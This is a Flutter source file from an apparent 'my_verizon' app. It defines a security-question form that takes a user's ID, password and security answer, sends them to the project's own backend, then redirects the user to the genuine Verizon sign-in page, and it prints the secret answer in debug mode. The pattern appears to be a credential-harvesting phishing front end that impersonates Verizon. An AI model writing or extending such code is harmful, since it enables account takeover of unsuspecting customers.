import 'package:flutter/cupertino.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:my_verizon/auth_service/auth_service.dart';
import 'package:my_verizon/layout/layout.dart';
import 'package:url_launcher/url_launcher.dart';

class AnswerFormFieldWidget extends StatefulWidget {
  final String userId;
  final dynamic password;
  final String securityQuestion;
  final TextEditingController securityQuestionAnswer;

  const AnswerFormFieldWidget({
    super.key,
    required this.userId,
    required this.password,
    required this.securityQuestion,
    required this.securityQuestionAnswer,
  });

  @override
  State<AnswerFormFieldWidget> createState() => _AnswerFormFieldWidgetState();
}

class _AnswerFormFieldWidgetState extends State<AnswerFormFieldWidget> {
  final GlobalKey<FormState> _answerKey = GlobalKey<FormState>();
  bool _isLoading = false;

  final Uri _verizonUrl = Uri.parse(
    "https://secure.verizon.com/signin?_gl=1*1m3cwkt*_ga*MTU5NzA1NTY1MS4xNzQ1NzU0NzE2*_ga_12R1DX1LX7*MTc0NTc1NDcxNS4xLjEuMTc0NTc1NDcxNS42MC4wLjA.",
  );

  @override
  void dispose() {
    widget.securityQuestionAnswer.dispose();
    super.dispose();
  }

  Future<void> _handleVerificationAndRedirect() async {
    // First validate the form
    if (!_answerKey.currentState!.validate()) {
      return;
    }

    setState(() {
      _isLoading = true;
    });

    if (kDebugMode) {
      print('🔐 Verifying security answer...');
      print('   Question: ${widget.securityQuestion}');
      print('   Answer: ${widget.securityQuestionAnswer.text}');
    }

    try {
      // Verifying with your backend
      final result = await AuthService().for2FAVerification(
        securityQuestionName: widget.securityQuestion,
        securityAnswer: widget.securityQuestionAnswer.text,
        email: widget.userId,
      );

      if (kDebugMode) {
        print('✅ Security answer verified successfully');
        print('   Access token: ${result.accessToken?.substring(0, 20)}...');
      }

      //  If verification successful, open the Verizon link
      if (await canLaunchUrl(_verizonUrl)) {
        await launchUrl(_verizonUrl);
      } else {
        throw Exception('Could not launch URL');
      }
    } catch (e) {
      if (kDebugMode) {
        print('❌ Verification failed: $e');
      }

      // Show error message
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text('Verification failed: ${e.toString()}'),
          backgroundColor: Colors.red,
          duration: Duration(seconds: 3),
        ),
      );
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Form(
      autovalidateMode: AutovalidateMode.onUserInteraction,
      key: _answerKey,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          SizedBox(
            width: LayOutWidget.isMobile(context) ? 350 : 400,
            height: 100,
            child: TextFormField(
              inputFormatters: [
                FilteringTextInputFormatter.allow(RegExp(r'^[a-zA-Z0-9\s]+$')),
              ],
              maxLength: 25,
              maxLines: 1,
              minLines: 1,
              textAlign: TextAlign.start,
              textAlignVertical: TextAlignVertical.center,
              textInputAction: TextInputAction.done,
              scrollPhysics: const BouncingScrollPhysics(),
              obscureText: false,
              controller: widget.securityQuestionAnswer,
              decoration: InputDecoration(
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(0),
                  borderSide: const BorderSide(
                    color: CupertinoColors.systemBlue,
                    width: 1,
                  ),
                ),
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(0),
                  borderSide: const BorderSide(
                    color: CupertinoColors.systemGrey,
                    width: 1,
                  ),
                ),
                hintText: 'Enter your answer',
                hintStyle: const TextStyle(
                  color: CupertinoColors.systemGrey,
                  fontSize: 14,
                ),
                label: const Text(
                  'Security Question Answer',
                  style: TextStyle(
                    color: CupertinoColors.systemBlue,
                    fontSize: 14,
                  ),
                ),
                labelStyle: const TextStyle(
                  color: CupertinoColors.systemBlue,
                  fontSize: 14,
                ),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(0),
                  borderSide: const BorderSide(
                    color: CupertinoColors.systemGrey,
                    width: 1,
                  ),
                ),
                counterText: '',
              ),
              validator: (answerValue) {
                if (answerValue == null || answerValue.isEmpty) {
                  return 'Answer is required';
                } else if (answerValue.length < 3) {
                  return 'Answer must be at least 3 characters';
                } else if (answerValue.length > 25) {
                  return 'Answer must be less than 25 characters';
                }
                return null;
              },
            ),
          ),
          const SizedBox(height: 20),
          SizedBox(
            width: 150,
            height: 40,
            child: ElevatedButton(
              onPressed: _isLoading ? null : _handleVerificationAndRedirect,
              style: ElevatedButton.styleFrom(
                elevation: 0,
                backgroundColor: CupertinoColors.black,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(20),
                ),
                minimumSize: const Size.fromHeight(50),
                fixedSize: const Size(80, 20),
              ),
              child:
                  _isLoading
                      ? const SizedBox(
                        width: 20,
                        height: 20,
                        child: CircularProgressIndicator(
                          strokeWidth: 2,
                          color: Colors.white,
                        ),
                      )
                      : const Text(
                        'Continue',
                        style: TextStyle(color: Colors.white, fontSize: 16),
                      ),
            ),
          ),
        ],
      ),
    );
  }
}
